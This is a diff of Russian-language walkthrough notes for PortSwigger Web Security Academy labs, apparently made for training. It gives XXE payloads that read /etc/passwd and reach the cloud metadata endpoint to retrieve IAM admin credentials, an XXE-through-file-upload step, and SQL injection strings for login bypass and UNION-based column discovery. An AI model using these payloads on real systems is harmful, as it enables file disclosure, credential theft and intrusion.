@@ -2,23 +2,23 @@
 
 1. https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
 
-1)зайти на сайт, 
++ 1)зайти на сайт, 
 
-2)выбрать продукт, 
++ 2)выбрать продукт, 
 
-3)нажать *Check stock*, 
++ 3)нажать *Check stock*, 
 
-4)перехватить Post запрос через BURP 
++ 4)перехватить Post запрос через BURP 
 
-5)после объявления xml добавить
++ 5)после объявления xml добавить
 
 ```xml
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "file:///etc/passwd"> ]> 
 ```
 
-6)заменить product id число на `&res;` 
++ 6)заменить product id число на `&res;` 
 
-7)после этого просто отправить запрос и в ответе придёт /etc/passwd
++ 7)после этого просто отправить запрос и в ответе придёт /etc/passwd
 
 ____
 
@@ -26,22 +26,22 @@ ____
 
 те же действия, что и в предыдущей. до пункта 4) 
 
-5)после объявления xml добавить:
++ 5)после объявления xml добавить:
 
 ```xml
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/"> ]>
 ```
 
-6)заменить product id на `&res;` отправить запрос, 
++ 6)заменить product id на `&res;` отправить запрос, 
 
-7)в ответе придет `latest` - добавить его к адресу и получим 
++ 7)в ответе придет `latest` - добавить его к адресу и получим 
 
 ```xml
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest"> ]> 
 ```
 и так далее, 
 
-n+1)в итоге получаем 
++ n+1)в итоге получаем 
 
 ```xml
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
@@ -66,15 +66,15 @@ ____
 
 4.https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
 
-+1)зайти на сайт
++ 1)зайти на сайт
 
-+2)выбрать статью 
++ 2)выбрать статью 
 
-+3)нажать отправить комментарий(заполнить все поля предварительно) 
++ 3)нажать отправить комментарий(заполнить все поля предварительно) 
 
-+4)перехватить запрос через Burp
++ 4)перехватить запрос через Burp
 
-+5)в поле для картинки вставить: 
++ 5)в поле для картинки вставить: 
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
@@ -97,15 +97,15 @@ ____
 
 1. https://portswigger.net/web-security/sql-injection/lab-login-bypass
 
-1)в графе login ввести administrator'--
++ 1)в графе login ввести administrator'--
 
 ____
 
 2. https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text 
 
-1)в category использовать '+union+select+NULL,NULL,NULL - так убедимся, что у нас 3 столбца в таблице
++ 1)в category использовать '+union+select+NULL,NULL,NULL - так убедимся, что у нас 3 столбца в таблице
 
-2)заменяем NULL по очереди на `HmnfQ2` - дано в задании
++ 2)заменяем NULL по очереди на `HmnfQ2` - дано в задании
 https://ac811f101ea3312280cb0ad600a4009a.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,%27HmnfQ2%27,NULL-- 
 
-3)второй столбец оказался верным - выводится результат
++ 3)второй столбец оказался верным - выводится результат
